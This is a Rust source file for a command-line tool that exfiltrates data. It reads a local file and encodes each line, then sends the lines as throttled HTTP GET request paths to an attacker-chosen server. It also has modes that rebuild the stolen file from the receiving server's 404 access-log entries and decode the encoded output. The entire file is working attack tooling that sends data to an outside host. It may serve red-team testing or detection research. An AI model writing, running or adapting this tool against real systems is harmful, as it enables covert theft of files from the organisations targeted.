mod utils;
use chrono::Utc;
use core::time::Duration;
use crate::utils::*;
use reqwest::Client;
use std::env;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let mut file_path = "";
    let mut server = "";
    let mut timeout = 0;

    if args.len() < 2 {
        match print_banner() {
            Ok(_) => {}
            Err(error) => {
                eprintln!("Error: {}", error);
            }
        }
        get_help();
        return Ok(());
    }

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-h" => {
                match print_banner() {
                    Ok(_) => {}
                    Err(error) => {
                        eprintln!("Error: {}", error);
                    }
                }
                get_help();
                return Ok(());
            }
            "-d" => {
                if i + 1 < args.len() {
                    let encfile = &args[i + 1];
                    decode_file(encfile)?;
                } else {
                    println!("Usage: {} -f <enc-path>", args[0]);
                }
                return Ok(());
            }
            "-f" => {
                if i + 1 < args.len() {
                    file_path = &args[i + 1];
                    i += 2; // Move to the next pair of arguments
                } else {
                    println!("Usage: {} -f <file-path>", args[0]);
                    return Ok(());
                }
            }
            "-r" => {
                if i + 4 < args.len() {
                    let logfile = &args[i + 1];
                    let ip_address = &args[i + 2];
                    let datetime = &args[i + 3];
                    let numreq = args[i + 4].parse().unwrap_or(0);
                    reconstruct_file(logfile, ip_address, datetime, numreq)?;
                } else {
                    println!("Usage: {} -r <logfile> <ip-address> <datetime> <numreq>", args[0]);
                }
                return Ok(());
            }
            "-s" => {
                if i + 1 < args.len() {
                    server = &args[i + 1];
                    i += 2; // Move to the next pair of arguments
                } else {
                    println!("Usage: {} -s <server>", args[0]);
                    return Ok(());
                }
            }
            "-t" => {
                if i + 1 < args.len() {
                    timeout = args[i + 1].parse().unwrap_or(0);
                    i += 2; // Move to the next pair of arguments
                } else {
                    println!("Usage: {} -t <timeout>", args[0]);
                    return Ok(());
                }
            }
            _ => {
                match print_banner() {
                    Ok(_) => {}
                    Err(error) => {
                        eprintln!("Error: {}", error);
                    }
                }
                println!("Invalid command: {}", args[i]);
                get_help();
                return Ok(());
            }
        }
    }

    let _ = print_banner();

    if file_path.is_empty() || server.is_empty() {
        println!("File path and target server must be specified.");
        return Ok(());
    }

    let mut request_count = 0; // Counter to keep track of the number of requests

    match read_file_content(file_path) {
        Ok((bytes, num_lines)) => {
            println!("Number of GET requests to exfiltrate the file: {}\n", num_lines);
            // Get the current date and time in UTC
            let utc_now = Utc::now();
            // Format the date and time as a string
            let formatted_date_time = utc_now.format("%d/%b/%Y:%H:%M:%S %z").to_string();
            println!("Exfiltrating file {} at {}:\n", file_path, formatted_date_time);
            /*for line in bytes.lines() {
                let line = line?; // Unwrap the Result<String, Error>
                let encoded_line = encode_data(&line)?;
                make_get_request(&encoded_line, server).await?;
                request_count += 1; // Increment the request counter
                sleep(Duration::from_secs(timeout)).await;
            }*/
            for line in bytes.split(|&b| b == b'\n') {
                let encoded_line = encode_data(line)?;
                make_get_request(&encoded_line, server).await?;
                request_count += 1;
                sleep(Duration::from_secs(timeout)).await;
            }
        }
        Err(err) => eprintln!("Error reading file: {}", err),
    }

    println!("\nNumber of requests done: {}", request_count);

    Ok(())
}

async fn make_get_request(line: &str, server: &str) -> Result<(), reqwest::Error> {
    let url = format!("{}/{}", server, line);
    let client = Client::new();
    client.get(&url).send().await?;
    println!("GET: {}", url);

    Ok(())
}

// read file content as bytes
fn read_file_content(file_path: &str) -> Result<(Vec<u8>, usize), io::Error> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // Count the number of newline characters in the buffer
    let num_lines = buffer.iter().filter(|&&b| b == b'\n').count() + 1;

    Ok((buffer, num_lines))
}

fn decode_file(encfile: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(file) = File::open(encfile) {
        let reader = BufReader::new(file);

        let mut decoded_file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open("decoded_file")
            .unwrap();

        // Iterate through each line in the log file
        for line in reader.lines() {
            if let Ok(enc_entry) = line {
                // Decode data
                let decoded_string = decode_data(&enc_entry);
                // Write the extracted string to the reconstructed file
                match decoded_string {
                    Ok(content) => writeln!(decoded_file, "{}", content)?,
                    Err(err) => eprintln!("Error decoding data: {}", err),
                }
            }
        }
    } else {
        println!("Failed to open encoded file.");
    }

    Ok(()) 
}

fn reconstruct_file(logfile: &str, ip_address: &str, datetime: &str, numreq: u64) -> Result<(), Box<dyn std::error::Error>> {
    // Open the log file
    if let Ok(file) = File::open(logfile) {
        let reader = BufReader::new(file);

        // Counter to keep track of the number of matching occurrences found
        let mut matching_occurrences = 0;

        // Boolean flag to track whether datetime has been found
        let mut datetime_found = false;

        // Create or open a new file to write the extracted strings
        let mut reconstructed_file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open("reconstructed_file")
            .unwrap();

        // Iterate through each line in the log file
        for line in reader.lines() {
            if let Ok(log_entry) = line {
                // Check if datetime has already been found
                if !datetime_found {
                    // Check if the log entry contains the specified datetime
                    if log_entry.contains(datetime) {
                        datetime_found = true;
                    } else {
                        continue; // Skip this line if datetime hasn't been found yet
                    }
                }
                if log_entry.contains(ip_address) {
                    // Split the log entry by whitespace to access the columns
                    let columns: Vec<&str> = log_entry.split_whitespace().collect();
                    // Check if the fourth column from the end contains "404"
                    if let Some(status_code) = columns.iter().rev().nth(3) {
                        if *status_code == "404" {
                            // Extract the string between "GET " and " HTTP"
                            if let Some(start) = log_entry.find("GET ") {
                                if let Some(end) = log_entry.find(" HTTP") {
                                    let extracted_string = &log_entry[start + 4..end][1..]; // [1..] removes the first char / 

                                    // Decode data
                                    let decoded_string = decode_data(extracted_string);
                                    // Write the extracted string to the reconstructed file
                                    match decoded_string {
                                        Ok(content) => writeln!(reconstructed_file, "{}", content)?,
                                        Err(err) => eprintln!("Error decoding data: {}", err),
                                    }

                                    // Increment the counter
                                    matching_occurrences += 1;

                                    // Check if the required number of occurrences has been found
                                    if matching_occurrences >= numreq {
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        println!("Failed to open log file.");
    }

    Ok(())
}